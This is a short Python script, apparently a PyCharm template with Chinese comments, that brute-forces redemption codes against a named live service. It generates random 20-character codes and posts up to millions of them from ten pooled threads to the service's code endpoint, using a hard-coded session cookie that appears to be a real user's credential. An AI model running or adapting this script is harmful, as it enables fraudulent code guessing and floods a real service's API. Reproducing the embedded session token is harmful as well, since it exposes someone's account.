# -*- coding: utf-8 -*-

# This is a sample Python script.
# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

import requests
import random
from concurrent.futures import ThreadPoolExecutor
import threading
import time


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


def generate_verification_code(len=6):
    ''' 随机生成6位的验证码 '''
    # 注意： 这里我们生成的是0-9A-Za-z的列表，当然你也可以指定这个list，这里很灵活
    # 比如： code_list = ['P','y','t','h','o','n','T','a','b'] # PythonTab的字母
    code_list = []

    for i in range(10):  # 0-9数字
        code_list.append(str(i))
    for i in range(65, 91):  # 对应从“A”到“Z”的ASCII码
        code_list.append(chr(i))
    # for i in range(97, 123): #对应从“a”到“z”的ASCII码
    #     code_list.append(chr(i))
    myslice = random.sample(code_list, len)  # 从list中随机获取6个元素，作为一个片断返回
    verification_code = ''.join(myslice)  # list to string

    return verification_code


def generate_code():
    return generate_verification_code(5) \
           + '-' + generate_verification_code(5) \
           + '-' + generate_verification_code(5) \
           + '-' + generate_verification_code(5)


# 定义一个准备作为线程任务的函数
def post_code(num=100):
    for i in range(num):
        try:
            url = "https://glados.rocks/api/user/code"
            code = generate_code()
            payload = "{\"code\":\"" + code + "\",\"force\":false}"
            headers = {
                'content-type': 'application/json;charset=UTF-8',
                'cookie': '_ga=GA1.2.1819942246.1618457198; __stripe_mid=645d56a1-4b35-4c60-8734-30fb8a8fc555a2f279; koa:sess=eyJ1c2VySWQiOjg4NjkzLCJfZXhwaXJlIjoxNjc4MDExOTk2MTY0LCJfbWF4QWdlIjoyNTkyMDAwMDAwMH0=; koa:sess.sig=XYwEHvRTaE2Gq-SQMhrK7fawnaA; _gid=GA1.2.100214738.1652091998; _gat_gtag_UA_104464600_2=1'
            }

            response = requests.post(url=url, headers=headers, data=payload)
            print(code)
            print(threading.current_thread().name + ": " + response.text)
        except Exception as e:
            print(e)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

    # 创建一个包含n条线程的线程池
    pool = ThreadPoolExecutor(max_workers=4)
    # 向线程池提交一个task, 1000000会作为action()函数的参数
    for i in range(10):
        future = pool.submit(post_code, 1000000)
        # 判断future代表的任务是否结束
        print(future.done())
        # 查看future代表的任务返回的结果
        # print(future.result())

    # 关闭线程池
    pool.shutdown()
# See PyCharm help at https://www.jetbrains.com/help/pycharm/
